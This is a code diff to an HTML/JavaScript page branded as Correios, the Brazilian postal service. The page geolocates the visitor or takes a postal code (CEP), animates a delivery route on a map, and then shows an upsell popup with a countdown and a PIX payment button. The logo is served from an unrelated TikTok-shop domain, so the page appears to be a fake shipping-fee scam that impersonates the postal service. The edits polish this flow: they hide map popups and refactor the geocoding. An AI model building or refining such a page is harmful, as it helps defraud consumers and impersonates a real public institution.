@@ -9,6 +9,18 @@
     <script src="https://cdn.jsdelivr.net/npm/@mapbox/polyline@1.1.0/src/polyline.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
+
+        .leaflet-popup, .leaflet-tooltip, .leaflet-marker-icon .leaflet-popup, .leaflet-marker-icon .leaflet-tooltip {
+    display: none !important;
+    visibility: hidden !important;
+    pointer-events: none !important;
+}
+.leaflet-marker-icon {
+    pointer-events: none !important;
+}
+[class*="leaflet-tooltip"], [class*="leaflet-popup"] {
+    display: none !important;
+}
         * {
             margin: 0;
             padding: 0;
@@ -23,8 +35,25 @@
             flex-direction: column;
             overflow: hidden;
         }
-
-        /* Splash branca animada */
+        /* --- REMOVER QUALQUER QUADRADO/TOOLTIP --- */
+        .leaflet-popup,
+        .leaflet-tooltip,
+        .leaflet-marker-icon .leaflet-popup,
+        .leaflet-marker-icon .leaflet-tooltip {
+            display: none !important;
+            visibility: hidden !important;
+            pointer-events: none !important;
+        }
+        /* Força que os marcadores não tenham interação que gere popup */
+        .leaflet-marker-icon {
+            pointer-events: none !important;
+        }
+        /* Caso algum tooltip seja gerado dinamicamente */
+        [class*="leaflet-tooltip"],
+        [class*="leaflet-popup"] {
+            display: none !important;
+        }
+        /* SPLASH BRANCA */
         .splash-screen {
             position: fixed;
             top: 0;
@@ -40,7 +69,7 @@
             transition: opacity 0.5s ease;
         }
         .splash-screen img {
-            width: 160px;
+            width: 140px;
             height: auto;
             margin-bottom: 30px;
         }
@@ -64,34 +93,25 @@
             text-align: center;
             padding: 0 20px;
         }
-
-        /* Header Correios - apenas logo maior */
+        /* HEADER */
         .correios-header {
             background: linear-gradient(135deg, #003366 0%, #002244 100%);
             padding: 12px 20px;
             display: flex;
             align-items: center;
-            justify-content: flex-start;
+            justify-content: center;
             border-bottom: 3px solid #ffcc00;
             box-shadow: 0 2px 6px rgba(0,0,0,0.1);
         }
         .logo-area img {
-            height: 56px;
+            height: 60px;
             width: auto;
             filter: brightness(0) invert(1);
         }
-        /* Mobile: logo ainda maior e centralizada */
         @media (max-width: 480px) {
-            .correios-header {
-                justify-content: center;
-                padding: 12px 16px;
-            }
-            .logo-area img {
-                height: 52px;
-            }
+            .correios-header { padding: 10px 16px; }
+            .logo-area img { height: 48px; }
         }
-
-        /* Área de CEP manual (quando localização negada) */
         .cep-manual-area {
             background: #fff;
             padding: 12px 16px;
@@ -101,9 +121,7 @@
             align-items: center;
             flex-wrap: wrap;
         }
-        .cep-manual-area.hide {
-            display: none;
-        }
+        .cep-manual-area.hide { display: none; }
         .cep-manual-area .label {
             font-size: 0.7rem;
             font-weight: bold;
@@ -138,11 +156,7 @@
             font-size: 0.85rem;
             transition: 0.2s;
         }
-        .cep-manual-area button:active {
-            transform: scale(0.96);
-        }
-
-        /* Mapa e overlays */
+        .cep-manual-area button:active { transform: scale(0.96); }
         .map-container {
             flex: 1;
             position: relative;
@@ -170,9 +184,7 @@
             box-shadow: 0 8px 25px rgba(0,0,0,0.2);
             text-align: center;
         }
-        .recalc-overlay.hide {
-            display: none;
-        }
+        .recalc-overlay.hide { display: none; }
         .recalc-text {
             font-weight: bold;
             font-size: 1rem;
@@ -182,8 +194,6 @@
             font-size: 0.75rem;
             color: #555;
         }
-
-        /* Upsell popup */
         .upsell-popup {
             position: fixed;
             bottom: 0;
@@ -198,9 +208,7 @@
             transition: transform 0.35s cubic-bezier(0.2, 0.9, 0.4, 1.1);
             border-top: 5px solid #ffcc00;
         }
-        .upsell-popup.show {
-            transform: translateY(0);
-        }
+        .upsell-popup.show { transform: translateY(0); }
         .badge-offer {
             background: #ffcc00;
             color: #003366;
@@ -274,9 +282,7 @@
             cursor: pointer;
             transition: 0.2s;
         }
-        .btn-pix:active {
-            transform: scale(0.97);
-        }
+        .btn-pix:active { transform: scale(0.97); }
         .close-upsell {
             position: absolute;
             top: 18px;
@@ -300,30 +306,6 @@
             color: #4a5568;
             flex-wrap: wrap;
         }
-
-        /* Responsividade */
-        @media (max-width: 480px) {
-            .popup-title {
-                font-size: 1.3rem;
-            }
-            .price-new {
-                font-size: 1.5rem;
-            }
-            .cep-manual-area button {
-                padding: 10px 16px;
-                font-size: 0.8rem;
-            }
-            .cep-manual-area input {
-                padding: 10px 14px;
-                font-size: 0.85rem;
-            }
-            .recalc-overlay {
-                left: 16px;
-                right: 16px;
-                padding: 16px;
-            }
-        }
-
         .spinner-box {
             width: 48px;
             height: 48px;
@@ -332,18 +314,23 @@
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
         }
+        @media (max-width: 480px) {
+            .popup-title { font-size: 1.3rem; }
+            .price-new { font-size: 1.5rem; }
+            .cep-manual-area button { padding: 10px 16px; font-size: 0.8rem; }
+            .cep-manual-area input { padding: 10px 14px; font-size: 0.85rem; }
+            .recalc-overlay { left: 16px; right: 16px; padding: 16px; }
+        }
     </style>
 </head>
 <body>
 
-    <!-- SPLASH BRANCA COM TEXTOS DINÂMICOS -->
     <div id="splash" class="splash-screen">
         <img src="https://panela-tiktokshop.vercel.app/images/correios2-removebg-preview.png" alt="Correios">
         <div class="loader"></div>
         <div class="splash-text" id="splashText">Abrindo sistema...</div>
     </div>
 
-    <!-- HEADER CORREIOS (apenas logo, sem texto) -->
     <div class="correios-header">
         <div class="logo-area">
             <img src="https://panela-tiktokshop.vercel.app/images/correios2-removebg-preview.png" alt="Correios">
@@ -425,9 +412,10 @@
                     attribution: '&copy; OSM & CartoDB',
                     subdomains: 'abcd'
                 }).addTo(map);
+                // Marcador CD - sem popup/tooltip
                 const cdIcon = L.divIcon({
-                    html: '<div style="background:#003366; width:40px; height:40px; border-radius:50%; border:2px solid #ffcc00; display:flex; align-items:center; justify-content:center;"><i class="fas fa-warehouse" style="color:white; font-size:20px;"></i></div>',
-                    iconSize: [40,40]
+                    html: '<div style="background:#003366; width:38px; height:38px; border-radius:50%; border:2px solid #ffcc00; display:flex; align-items:center; justify-content:center;"><i class="fas fa-warehouse" style="color:white; font-size:18px;"></i></div>',
+                    iconSize: [38,38]
                 });
                 L.marker([CD.lat, CD.lng], { icon: cdIcon }).addTo(map);
             }
@@ -535,6 +523,38 @@
                 stopCountdown();
             }
 
+            async function trackWithCoords(lat, lng, cityName = null) {
+                hideUpsell();
+                showOverlay(true);
+                try {
+                    const destCoords = { lat, lng };
+                    let cidade = cityName;
+                    if (!cidade) {
+                        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=10&addressdetails=1`;
+                        const resp = await fetch(url, { headers: { 'User-Agent': 'FreteApp/1.0' } });
+                        const data = await resp.json();
+                        cidade = data.address?.city || data.address?.town || data.address?.village || "sua região";
+                    }
+                    lastCity = cidade;
+                    const routePoints = await getRoadRoute(CD, destCoords);
+                    const bounds = L.latLngBounds([CD, destCoords]);
+                    map.fitBounds(bounds, { padding: [60, 60] });
+                    const destIcon = L.divIcon({
+                        html: '<div style="background:#00a650; width:38px; height:38px; border-radius:50%; border:2px solid #ffcc00; display:flex; align-items:center; justify-content:center;"><i class="fas fa-flag-checkered" style="color:white; font-size:18px;"></i></div>',
+                        iconSize: [38,38]
+                    });
+                    if (window.destMarker) map.removeLayer(window.destMarker);
+                    window.destMarker = L.marker([destCoords.lat, destCoords.lng], { icon: destIcon }).addTo(map);
+                    await animateRoute(routePoints, 2200);
+                    showOverlay(false);
+                    showUpsell(cidade);
+                } catch (err) {
+                    console.error(err);
+                    showOverlay(false);
+                    alert("Erro ao calcular rota. Tente novamente ou digite o CEP manualmente.");
+                }
+            }
+
             async function trackWithCEP(cep) {
                 hideUpsell();
                 if (!cep) return;
@@ -547,8 +567,8 @@
                     const bounds = L.latLngBounds([CD, coords]);
                     map.fitBounds(bounds, { padding: [60, 60] });
                     const destIcon = L.divIcon({
-                        html: '<div style="background:#00a650; width:40px; height:40px; border-radius:50%; border:2px solid #ffcc00; display:flex; align-items:center; justify-content:center;"><i class="fas fa-flag-checkered" style="color:white; font-size:20px;"></i></div>',
-                        iconSize: [40,40]
+                        html: '<div style="background:#00a650; width:38px; height:38px; border-radius:50%; border:2px solid #ffcc00; display:flex; align-items:center; justify-content:center;"><i class="fas fa-flag-checkered" style="color:white; font-size:18px;"></i></div>',
+                        iconSize: [38,38]
                     });
                     if (window.destMarker) map.removeLayer(window.destMarker);
                     window.destMarker = L.marker([coords.lat, coords.lng], { icon: destIcon }).addTo(map);
@@ -573,37 +593,7 @@
                     document.getElementById('cepManualArea').classList.add('hide');
                     const lat = position.coords.latitude;
                     const lng = position.coords.longitude;
-                    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`;
-                    const resp = await fetch(url, { headers: { 'User-Agent': 'FreteApp/1.0' } });
-                    const data = await resp.json();
-                    if (data && data.address) {
-                        let cep = data.address.postcode ? data.address.postcode.replace(/\D/g, '') : null;
-                        let city = data.address.city || data.address.town || data.address.village;
-                        if (cep) {
-                            await trackWithCEP(cep);
-                        } else if (city) {
-                            const coords = await geocodeByCity(`${city}, Brasil`);
-                            lastCity = city;
-                            const routePoints = await getRoadRoute(CD, coords);
-                            const bounds = L.latLngBounds([CD, coords]);
-                            map.fitBounds(bounds, { padding: [60, 60] });
-                            const destIcon = L.divIcon({
-                                html: '<div style="background:#00a650; width:40px; height:40px; border-radius:50%; border:2px solid #ffcc00; display:flex; align-items:center; justify-content:center;"><i class="fas fa-flag-checkered" style="color:white;"></i></div>',
-                                iconSize: [40,40]
-                            });
-                            if (window.destMarker) map.removeLayer(window.destMarker);
-                            window.destMarker = L.marker([coords.lat, coords.lng], { icon: destIcon }).addTo(map);
-                            await animateRoute(routePoints, 2200);
-                            showOverlay(false);
-                            showUpsell(city);
-                        } else {
-                            document.getElementById('cepManualArea').classList.remove('hide');
-                            showOverlay(false);
-                        }
-                    } else {
-                        document.getElementById('cepManualArea').classList.remove('hide');
-                        showOverlay(false);
-                    }
+                    await trackWithCoords(lat, lng, null);
                 }, (error) => {
                     console.warn(error);
                     showOverlay(false);
